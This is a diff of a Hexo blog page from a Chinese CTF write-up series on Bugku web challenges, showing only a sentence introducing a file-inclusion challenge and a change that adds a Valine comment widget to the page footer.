 <h3 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h3><p>网址：<a href="http://120.24.86.145:9011/" target="_blank" rel="noopener">http://120.24.86.145:9011/</a></p>
 <p>看页面像是文件上传，但是尝试上传png文件，jpg文件都上传不了，再看看url有个op参数，看着有点像是文件包含，试着用php伪协议读一下文件看看能不能读出来，payloads:</p>
@@ -265,7 +265,25 @@
 
 
 
-</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2018/08/06/Bugkuctf-Web(3)/">https://nikoeurus.github.io/2018/08/06/Bugkuctf-Web(3)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/11/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><i class="fa fa-chevron-left">  </i><span>CBC字节翻转攻击</span></a></div><div class="next-post pull-right"><a href="/2018/08/04/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"><span>sql约束攻击</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2018/08/06/Bugkuctf-Web(3)/">https://nikoeurus.github.io/2018/08/06/Bugkuctf-Web(3)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/11/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><i class="fa fa-chevron-left">  </i><span>CBC字节翻转攻击</span></a></div><div class="next-post pull-right"><a href="/2018/08/04/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"><span>sql约束攻击</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
+  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
+  placeholder:'Just go go',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
   $('#top-container').addClass('is-mobile')
